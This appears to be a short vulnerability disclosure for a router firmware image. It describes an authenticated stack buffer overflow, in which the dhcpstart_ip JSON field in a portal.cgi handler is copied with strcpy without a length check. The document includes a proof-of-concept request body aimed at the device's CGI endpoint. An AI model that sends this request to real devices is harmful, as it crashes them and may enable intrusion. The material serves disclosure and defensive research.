## Firmware

Firmware version:FW_E8450_1.2.00.360516_prod_signed.img

## Analyze

Authenticated buffer overflow

The vulnerability is located at address 0x413640 . The sub_422eb8 function is an json parsing function.

The parsed fields(dhcpstart_ip) are copied to the stack using strcpy without length verification.

![](../imgs/16.png)

## Poc

It can be seen that after setting specific user input, the original length of the content is passed into the strcpy parameter, causing the program to crash.

![](../imgs/17.png)

Send the following data to this url to trigger the vulnerability:  http://target/cgi-bin/portal.cgi 

```json
{"action":"get_ip_range_with_start_count","page":"dashboard_configuration","lan_ipaddr":"1","lan_netmask":"2","hidden_dhcp_num":"3","dhcpstart_ip":""}
```
